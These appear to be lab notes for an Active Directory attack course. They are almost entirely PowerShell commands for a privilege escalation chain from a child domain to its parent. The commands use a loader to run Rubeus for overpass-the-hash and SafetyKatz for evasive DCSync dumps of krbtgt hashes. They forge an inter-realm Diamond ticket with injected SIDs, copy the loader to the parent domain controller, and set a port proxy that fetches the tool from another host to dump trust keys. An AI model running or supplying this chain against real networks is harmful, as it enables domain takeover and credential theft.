#### OPtH + Obtain krbtgt hash
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

Obtain Domain Controllers SID of parent domain for interrealm Diamond ticket
```powershell
Get-DomainGroup -Identity "Domain Controllers" -domain moneycorp.local
```

Forge interrealm Diamond ticket using the DC identity 
> **Note:** `/sids` = (Domain Controllers SID), (Enterprise Domain Controllers -  S-1-5-9 )
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:dcorp-dc$ /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:1000 /sids:S-1-5-21-335606122-960912869-3279953914-516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Run DCsync on parent domain
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

Parent domain Cross trust
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\mcorp-dc.MONEYCORP.LOCAL\C$\Users\Public\Loader.exe

$null | winrs -r:mcorp-dc.MONEYCORP.LOCAL "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
```

```powershell
winrs -r:mcorp-dc.MONEYCORP.LOCAL cmd

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

